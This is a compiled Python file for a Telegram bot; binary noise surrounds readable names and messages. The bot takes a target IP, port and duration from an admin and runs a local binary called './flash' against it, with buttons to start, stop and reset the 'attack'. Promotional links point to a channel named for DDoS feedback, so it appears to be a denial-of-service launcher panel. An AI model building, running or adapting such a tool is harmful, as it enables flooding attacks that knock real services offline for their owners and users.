U
    Z�g�  �                   @   s"  d dl Z d dlZd dlmZmZmZ d dlmZmZm	Z	m
Z
mZmZ d dlmZ dZejdejd� dZdadadadaeed	�d
d�Zeejd�dd�Zeejd�dd�Zeejd�dd�Zeejd�dd�Zeejd�dd�Zeejd�dd�Zeejd�dd�Z dd� Z!e"dk�re!�  dS )�    N)�Update�InlineKeyboardButton�InlineKeyboardMarkup)�Application�CommandHandler�MessageHandler�CallbackQueryHandler�ContextTypes�filters)�TOKENl   yM�. z4%(asctime)s - %(name)s - %(levelname)s - %(message)s)�format�levelz./flash)�update�returnc                 C   s   | j jtkS )N)Zeffective_user�id�ADMIN_ID)r   � r   �f.py�is_admin   s    r   �r   �contextc                 �   sP   t | �s| j�d�I d H  d S tddd�gg}t|�}| jjd|d�I d H  d S )N�This bot is for admin use only.u   🚀Attack🚀�attack�Zcallback_datauf   By https://t.me/flashmainchannel 🚀Press the Attack button to start CHIN TAPAK DUM DUM (●'◡'●)��reply_markup)r   �message�
reply_textr   r   )r   r   �keyboardr   r   r   r   �start   s    r   c                 �   s`   | j }t| �s2|j�d�I d H  |�� I d H  d S |�� I d H  |jdkr\|j�d�I d H  d S )N�"This action is for admin use only.r   un   By https://t.me/FLASH_502 Please enter the target, port, and time in the format:<target> <port> <time>🚀🚀)�callback_queryr   r   r   �answer�data�r   r   Zqueryr   r   r   �button_handler$   s    
r%   c                 �   s�   t | �s| j�d�I d H  d S z�| jj�� \}}}|at|�at|�at	ddd�gt	ddd�gt	ddd�gg}t
|�}| jjd	t� d
t� dt� d�|d�I d H  W n& tk
r�   | j�d�I d H  Y nX d S )Nr   u   Start Attack🚀�start_attackr   u   Stop Attack❌�stop_attacku   Reset Attack⚙️�reset_attackzTarget: z, Port: z, Time: z* seconds configured.
Now choose an action:r   uK   Invalid format. Please enter in the format: 
<target> <port> <time>🚀🚀)r   r   r   �text�split�	target_ip�int�target_port�attack_timer   r   �
ValueError)r   r   �targetZport�timer   r   r   r   r   �handle_input1   s$    ��r2   c              
   �   s  t | �s | jj�d�I d H  d S tr,tr,tsD| jj�d�I d H  d S trlt�� d krl| jj�d�I d H  d S zPt	j
tttt�tt�gt	jt	jd�a| jj�dt� dt� dt� d��I d H  W nN tk
�r
 } z.| jj�d	|� ��I d H  t�d	|� �� W 5 d }~X Y nX d S )
Nr    z2Please configure the target, port, and time first.zAttack is already running.)�stdout�stderru\   CHIN TAPAK DUM DUM(●'◡'●) FeedBack De Dio Yaad se 😡 :- 👉 https://t.me/FLASH_502 �:z for z. seconds https://t.me/addlist/aGuzDCoYQChkN2Q1zError starting attack: )r   r!   r   r   r+   r-   r.   �process�poll�
subprocess�Popen�BINARY_PATH�str�PIPE�	Exception�logging�error)r   r   �er   r   r   r&   M   s    $,r&   c                 �   sp   t | �s | jj�d�I d H  d S tr0t�� d k	rH| jj�d�I d H  d S t��  t��  | jj�d�I d H  d S )Nr    uE   CHIN TAPAK DUM DUM NHI CHAL RHA (●'◡'●) t.me/FLASHddosFEEDBACK zAttack stopped.)r   r!   r   r   r6   r7   �	terminate�waitr   r   r   r   r'   d   s    r'   c                 �   sd   t | �s | jj�d�I d H  d S tr@t�� d kr@t��  t��  d ad a	d a
| jj�d�I d H  d S )Nr    ux   Attack reset. By https://t.me/FLASH_502 Please enter the target, port, and time in the format:<target> <port> <time>🚀)r   r!   r   r   r6   r7   rA   rB   r+   r-   r.   r   r   r   r   r(   s   s    r(   c                 �   s�   t | �s | jj�d�I d H  d S | j}|�� I d H  |jdkrPt| |�I d H  n6|jdkrlt| |�I d H  n|jdkr�t| |�I d H  d S )Nr    r&   r'   r(   )	r   r!   r   r   r"   r#   r&   r'   r(   r$   r   r   r   �button_callback_handler�   s    


rC   c                  C   sl   t �� �t��� } | �tdt�� | �tt	dd�� | �tt
dd�� | �ttjtj @ t�� | ��  d S )Nr   z^attack$)�patternz)^(start_attack|stop_attack|reset_attack)$)r   Zbuilder�tokenr   ZbuildZadd_handlerr   r   r   r%   rC   r   r
   ZTEXTZCOMMANDr2   Zrun_polling)Zapplicationr   r   r   �main�   s    rF   �__main__)#r8   r>   Ztelegramr   r   r   Ztelegram.extr   r   r   r   r	   r
   Zflashhr   r   ZbasicConfig�INFOr:   r6   r+   r-   r.   �boolr   ZDEFAULT_TYPEr   r%   r2   r&   r'   r(   rC   rF   �__name__r   r   r   r   �<module>   s,    

